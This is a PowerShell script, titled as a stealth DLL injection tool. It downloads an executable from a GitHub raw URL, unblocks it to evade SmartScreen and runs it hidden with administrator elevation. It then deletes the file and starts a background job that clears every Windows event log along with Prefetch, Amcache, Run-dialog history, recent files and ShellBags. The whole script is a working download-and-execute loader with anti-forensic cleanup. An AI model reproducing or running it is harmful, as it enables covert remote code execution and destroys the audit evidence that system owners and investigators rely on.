# ================================
# DLL Injection Tool (Stealth Mode)
# ================================

# STEP 1: Define GitHub URL & Temp EXE Path
$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/ConsoleApplication6.exe"
$tempPath = "$env:TEMP\ConsoleApplication6.exe"

# STEP 2: Download the EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing -ErrorAction SilentlyContinue

# STEP 3: Unblock to prevent SmartScreen
Unblock-File -Path $tempPath -ErrorAction SilentlyContinue

# STEP 4: Run the EXE silently as admin
$proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb RunAs -PassThru
$proc.WaitForExit()

# STEP 5: Remove EXE after injection
Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue

# STEP 6: Stealth Cleanup Logs
Start-Job -ScriptBlock {
    try {
        # Clear Windows Event Logs
        wevtutil el | ForEach-Object { wevtutil cl $_ } > $null 2>&1

        # Delete Prefetch
        Remove-Item -Path "$env:SystemRoot\Prefetch\*" -Force -ErrorAction SilentlyContinue

        # Clear Amcache (Program execution history)
        Remove-Item -Path "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue

        # Clear Run Dialog history
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

        # Clear Recent files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

        # Clear ShellBags
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}
} | Out-Null
